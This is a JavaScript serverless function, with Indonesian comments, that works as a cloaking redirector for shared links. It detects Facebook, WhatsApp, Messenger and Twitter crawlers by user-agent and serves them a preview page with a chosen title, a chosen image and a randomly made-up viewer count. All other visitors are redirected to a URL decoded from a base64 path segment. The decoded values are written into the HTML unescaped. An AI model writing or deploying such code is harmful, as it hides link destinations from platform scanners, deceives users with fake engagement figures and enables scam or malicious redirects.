export async function onRequest(context) {
  const url = new URL(context.request.url);
  // Mengambil bagian setelah slash terakhir
  // Contoh: /bola/base64kode -> p = "base64kode"
  const pathParts = url.pathname.split('/');
  const p = pathParts[pathParts.length - 1];
  
  let u = 'https://google.com', t = 'Loading...', i = '';

  if (p && p.length > 10) { // Cek apakah p ada dan cukup panjang (bukan sekedar path kosong)
    try {
      const decoded = atob(p);
      const params = new URLSearchParams(decoded);
      u = params.get('u') || u;
      t = params.get('t') || t;
      i = params.get('i') || i;
    } catch (e) {}
  }

  const randomNum = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000;
  const formattedNum = randomNum.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
  const variations = [`${formattedNum} Online Members`, `${formattedNum} Views Active`, `${formattedNum} Active Now` ];
  const d = variations[Math.floor(Math.random() * variations.length)];

  const ua = context.request.headers.get('user-agent') || '';
  const isBot = /facebookexternalhit|Facebot|WhatsApp|Messenger|Twitterbot/i.test(ua);

  if (isBot) {
    return new Response(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>${t}</title><meta name="description" content="${d}"><meta property="og:title" content="${t}"><meta property="og:description" content="${d}"><meta property="og:image" content="${i}"><meta property="og:type" content="website"><meta name="twitter:card" content="summary_large_image"></head><body></body></html>`, { 
      headers: { "content-type": "text/html;charset=UTF-8" } 
    });
  }

  return new Response(null, { status: 302, headers: { "Location": u } });
}